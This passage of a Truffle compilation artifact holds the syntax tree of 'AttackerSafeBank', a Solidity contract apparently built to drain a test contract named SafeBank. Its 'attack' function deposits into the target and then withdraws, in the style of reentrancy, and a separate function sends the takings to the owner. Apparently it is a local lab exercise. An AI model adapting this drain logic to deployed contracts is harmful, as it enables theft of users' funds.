                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 251,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "1817:7:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 253,
                  "nodeType": "VariableDeclarationStatement",
                  "src": "1817:21:1"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        "id": 258,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "expression": {
                            "id": 255,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 4294967281,
                            "src": "1868:3:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 256,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "value",
                          "nodeType": "MemberAccess",
                          "src": "1868:9:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "<",
                        "rightExpression": {
                          "id": 257,
                          "name": "_targetAmount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 248,
                          "src": "1880:13:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "src": "1868:25:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "4e65656420746f2073656e6420736f6d6520457468657220746f2061747461636b206c657373207468616e2074617267657420616d6f756e74",
                        "id": 259,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1895:59:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_8e3800e9eafff4909e80fdc3507dff7830a2f1e25b0abc3ede30690336dbe179",
                          "typeString": "literal_string \"Need to send some Ether to attack less than target amount\""
                        },
                        "value": "Need to send some Ether to attack less than target amount"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_8e3800e9eafff4909e80fdc3507dff7830a2f1e25b0abc3ede30690336dbe179",
                          "typeString": "literal_string \"Need to send some Ether to attack less than target amount\""
                        }
                      ],
                      "id": 254,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        4294967278,
                        4294967278
                      ],
                      "referencedDeclaration": 4294967278,
                      "src": "1860:7:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 260,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1860:95:1",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 261,
                  "nodeType": "ExpressionStatement",
                  "src": "1860:95:1"
                },
                {
                  "expression": {
                    "id": 268,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 262,
                      "name": "balVulnerable",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 252,
                      "src": "1968:13:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "expression": {
                        "arguments": [
                          {
                            "id": 265,
                            "name": "vulnerable",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 180,
                            "src": "1992:10:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_SafeBank_$424",
                              "typeString": "contract SafeBank"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_SafeBank_$424",
                              "typeString": "contract SafeBank"
                            }
                          ],
                          "id": 264,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "1984:7:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 263,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "1984:7:1",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 266,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1984:19:1",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "id": 267,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "balance",
                      "nodeType": "MemberAccess",
                      "src": "1984:27:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "1968:43:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "id": 269,
                  "nodeType": "ExpressionStatement",
                  "src": "1968:43:1"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        "id": 273,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "id": 271,
                          "name": "_targetAmount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 248,
                          "src": "2030:13:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "<=",
                        "rightExpression": {
                          "id": 272,
                          "name": "balVulnerable",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 252,
                          "src": "2047:13:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "src": "2030:30:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "54617267657420616d6f756e74206d757374206265206c657373207468616e2062616c616e6365206f662076756c6e657261626c6520636f6e7472616374",
                        "id": 274,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "2062:64:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_a1aa1da52f27072dbbd9a5344e55e8540252ac7449a2689f67bbdecf91209156",
                          "typeString": "literal_string \"Target amount must be less than balance of vulnerable contract\""
                        },
                        "value": "Target amount must be less than balance of vulnerable contract"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_a1aa1da52f27072dbbd9a5344e55e8540252ac7449a2689f67bbdecf91209156",
                          "typeString": "literal_string \"Target amount must be less than balance of vulnerable contract\""
                        }
                      ],
                      "id": 270,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        4294967278,
                        4294967278
                      ],
                      "referencedDeclaration": 4294967278,
                      "src": "2022:7:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 275,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2022:105:1",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 276,
                  "nodeType": "ExpressionStatement",
                  "src": "2022:105:1"
                },
                {
                  "expression": {
                    "id": 279,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 277,
                      "name": "targetAmount",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 184,
                      "src": "2148:12:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "id": 278,
                      "name": "_targetAmount",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 248,
                      "src": "2163:13:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "2148:28:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "id": 280,
                  "nodeType": "ExpressionStatement",
                  "src": "2148:28:1"
                },
                {
                  "expression": {
                    "id": 286,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 281,
                      "name": "drainedAmount",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 186,
                      "src": "2187:13:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "id": 285,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "leftHandSide": {
                        "id": 282,
                        "name": "totalWithdraw",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 191,
                        "src": "2203:13:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "nodeType": "Assignment",
                      "operator": "=",
                      "rightHandSide": {
                        "expression": {
                          "id": 283,
                          "name": "msg",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 4294967281,
                          "src": "2219:3:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_magic_message",
                            "typeString": "msg"
                          }
                        },
                        "id": 284,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "value",
                        "nodeType": "MemberAccess",
                        "src": "2219:9:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "src": "2203:25:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "2187:41:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "id": 287,
                  "nodeType": "ExpressionStatement",
                  "src": "2187:41:1"
                },
                {
                  "expression": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "argumentTypes": [],
                        "expression": {
                          "id": 288,
                          "name": "vulnerable",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 180,
                          "src": "2309:10:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_SafeBank_$424",
                            "typeString": "contract SafeBank"
                          }
                        },
                        "id": 290,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "deposit",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 367,
                        "src": "2309:18:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_payable$__$returns$__$",
                          "typeString": "function () payable external"
                        }
                      },
                      "id": 293,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "names": [
                        "value"
                      ],
                      "nodeType": "FunctionCallOptions",
                      "options": [
                        {
                          "expression": {
                            "id": 291,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 4294967281,
                            "src": "2335:3:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 292,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "value",
                          "nodeType": "MemberAccess",
                          "src": "2335:9:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        }
                      ],
                      "src": "2309:36:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_payable$__$returns$__$value",
                        "typeString": "function () payable external"
                      }
                    },
                    "id": 294,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2309:38:1",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 295,
                  "nodeType": "ExpressionStatement",
                  "src": "2309:38:1"
                },
                {
                  "expression": {
                    "id": 302,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 296,
                      "name": "prevBalanceVulnerableContract",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 189,
                      "src": "2360:29:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "expression": {
                        "arguments": [
                          {
                            "id": 299,
                            "name": "vulnerable",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 180,
                            "src": "2400:10:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_SafeBank_$424",
                              "typeString": "contract SafeBank"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_SafeBank_$424",
                              "typeString": "contract SafeBank"
                            }
                          ],
                          "id": 298,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "2392:7:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 297,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "2392:7:1",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 300,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "2392:19:1",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "id": 301,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "balance",
                      "nodeType": "MemberAccess",
                      "src": "2392:27:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "2360:59:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "id": 303,
                  "nodeType": "ExpressionStatement",
                  "src": "2360:59:1"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "expression": {
                          "id": 307,
                          "name": "msg",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 4294967281,
                          "src": "2513:3:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_magic_message",
                            "typeString": "msg"
                          }
                        },
                        "id": 308,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "value",
                        "nodeType": "MemberAccess",
                        "src": "2513:9:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 304,
                        "name": "vulnerable",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 180,
                        "src": "2493:10:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_SafeBank_$424",
                          "typeString": "contract SafeBank"
                        }
                      },
                      "id": 306,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "withdraw",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 412,
                      "src": "2493:19:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
                        "typeString": "function (uint256) external"
                      }
                    },
                    "id": 309,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2493:30:1",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 310,
                  "nodeType": "ExpressionStatement",
                  "src": "2493:30:1"
                }
              ]
            },
            "functionSelector": "64dd891a",
            "id": 312,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "attack",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 249,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 248,
                  "mutability": "mutable",
                  "name": "_targetAmount",
                  "nodeType": "VariableDeclaration",
                  "scope": 312,
                  "src": "1766:21:1",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 247,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "1766:7:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "1765:23:1"
            },
            "returnParameters": {
              "id": 250,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1806:0:1"
            },
            "scope": 341,
            "src": "1750:826:1",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 335,
              "nodeType": "Block",
              "src": "2648:131:1",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "id": 319,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "expression": {
                            "id": 316,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 4294967281,
                            "src": "2667:3:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 317,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "sender",
                          "nodeType": "MemberAccess",
                          "src": "2667:10:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "==",
                        "rightExpression": {
                          "id": 318,
                          "name": "owner",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 182,
                          "src": "2681:5:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "src": "2667:19:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "4f6e6c79206f776e65722063616e207769746864726177",
                        "id": 320,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "2688:25:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_5e9f184f94ce24cc63fc5ec28c25b2861cda6fa2c12f36c889d1b47ea3eab6ac",
                          "typeString": "literal_string \"Only owner can withdraw\""
                        },
                        "value": "Only owner can withdraw"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_5e9f184f94ce24cc63fc5ec28c25b2861cda6fa2c12f36c889d1b47ea3eab6ac",
                          "typeString": "literal_string \"Only owner can withdraw\""
                        }
                      ],
                      "id": 315,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        4294967278,
                        4294967278
                      ],
                      "referencedDeclaration": 4294967278,
                      "src": "2659:7:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 321,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2659:55:1",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 322,
                  "nodeType": "ExpressionStatement",
                  "src": "2659:55:1"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "id": 330,
                              "name": "this",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 4294967268,
                              "src": "2757:4:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_AttackerSafeBank_$341",
                                "typeString": "contract AttackerSafeBank"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_contract$_AttackerSafeBank_$341",
                                "typeString": "contract AttackerSafeBank"
                              }
                            ],
                            "id": 329,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "2749:7:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_address_$",
                              "typeString": "type(address)"
                            },
                            "typeName": {
                              "id": 328,
                              "name": "address",
                              "nodeType": "ElementaryTypeName",
                              "src": "2749:7:1",
                              "typeDescriptions": {}
                            }
                          },
                          "id": 331,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "2749:13:1",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "id": 332,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "balance",
                        "nodeType": "MemberAccess",
                        "src": "2749:21:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "arguments": [
                          {
                            "id": 325,
                            "name": "owner",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 182,
                            "src": "2733:5:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 324,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "2725:8:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 323,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "2725:8:1",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 326,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "2725:14:1",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      },
                      "id": 327,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "transfer",
                      "nodeType": "MemberAccess",
                      "src": "2725:23:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
                        "typeString": "function (uint256)"
                      }
                    },
                    "id": 333,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2725:46:1",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 334,
                  "nodeType": "ExpressionStatement",
                  "src": "2725:46:1"
                }
              ]
            },
            "functionSelector": "24600fc3",
            "id": 336,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "withdrawFunds",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 313,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "2636:2:1"
            },
            "returnParameters": {
              "id": 314,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "2648:0:1"
            },
            "scope": 341,
            "src": "2614:165:1",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 339,
              "nodeType": "Block",
              "src": "2880:54:1",
              "statements": []
            },
            "functionSelector": "d0e30db0",
            "id": 340,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "deposit",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 337,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "2860:2:1"
            },
            "returnParameters": {
              "id": 338,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "2880:0:1"
            },
            "scope": 341,
            "src": "2844:90:1",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 342,
        "src": "126:2816:1"
      }
    ],
    "src": "33:2911:1"
  },
  "compiler": {
    "name": "solc",
    "version": "0.8.0+commit.c7dfd78e.Emscripten.clang"
  },
  "networks": {
    "5777": {
      "events": {},
      "links": {},
      "address": "0xC236043a5895d18e757DfDe869bBa35C674d39e8",
      "transactionHash": "0x2c072398e32a80fe648cb11da5ec085fd9b5960bb45b7009c13f9767dcf47efd"
    }
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-09-30T03:44:24.896Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}